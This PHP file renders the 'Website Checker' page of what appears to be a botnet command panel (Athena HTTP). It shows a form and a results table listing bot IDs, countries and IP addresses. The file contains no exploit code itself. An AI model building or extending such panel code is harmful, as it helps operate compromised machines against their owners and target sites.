<?php

	if(!defined('AthenaHTTP')) header('Location: ..');

	$PAGE_INCLUDE = '';
	
	require_once './include/inc_webchecker.php';
	
	if($STATUS_NOTE)
	{
		$PAGE_INCLUDE .= '			<div class="content small">' . "\n";
		$PAGE_INCLUDE .= '				<span class="title"> </span>' . "\n";
		$PAGE_INCLUDE .= '				<p>' . "\n";
		$PAGE_INCLUDE .= '					' . $STATUS_MESSAGE . "\n";
		$PAGE_INCLUDE .= '				</p>' . "\n";
		$PAGE_INCLUDE .= '			</div>' . "\n";
	}
		
	$PAGE_INCLUDE .= '			<div class="content small">' . "\n";
	$PAGE_INCLUDE .= '				<span class="title">Website Checker</span>' . "\n";
	$PAGE_INCLUDE .= '				<form action="./index.php?p=checker" method="POST">' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Website:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input type="text" name="checker_website" /></span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<span class="foot">' . "\n";
	$PAGE_INCLUDE .= '						<input type="submit" value="Check Website" /> ' . "\n";
	$PAGE_INCLUDE .= '					</span>' . "\n";
	$PAGE_INCLUDE .= '				</form>' . "\n";
	$PAGE_INCLUDE .= '			</div>' . "\n";
	$PAGE_INCLUDE .= '			<div class="content">' . "\n";
	$PAGE_INCLUDE .= '				<span class="title">Results</span>' . "\n";
	$PAGE_INCLUDE .= '				<table>' . "\n";
	$PAGE_INCLUDE .= '					<tr>' . "\n";
	$PAGE_INCLUDE .= '						<th>Bot Id</th>' . "\n";
	$PAGE_INCLUDE .= '						<th>Country</th>' . "\n";
	$PAGE_INCLUDE .= '						<th>Website</th>' . "\n";
	$PAGE_INCLUDE .= '						<th>IP Address</th>' . "\n";
	$PAGE_INCLUDE .= '						<th>Result</th>' . "\n";
	$PAGE_INCLUDE .= '					</tr>' . "\n";
	$PAGE_INCLUDE .= $PAGE_INCLUDE_CHECKLIST;
	$PAGE_INCLUDE .= '					<tr>' . "\n";
	$PAGE_INCLUDE .= '						<td></td>' . "\n";
	$PAGE_INCLUDE .= '						<td></td>' . "\n";
	$PAGE_INCLUDE .= '						<td></td>' . "\n";
	$PAGE_INCLUDE .= '						<td></td>' . "\n";
	$PAGE_INCLUDE .= '						<td></td>' . "\n";
	$PAGE_INCLUDE .= '					</tr>' . "\n";
	$PAGE_INCLUDE .= '				</table>' . "\n";
	$PAGE_INCLUDE .= '				<span class="foot">' . "\n";
	$PAGE_INCLUDE .= '					<form action="./index.php?p=checker" method="POST">' . "\n";
	$PAGE_INCLUDE .= '						<input type="submit" name="checker_clear" value="Clear" /> ' . "\n";
	$PAGE_INCLUDE .= '					</form>' . "\n";
	$PAGE_INCLUDE .= '				</span>' . "\n";
	$PAGE_INCLUDE .= '			</div>' . "\n";

?>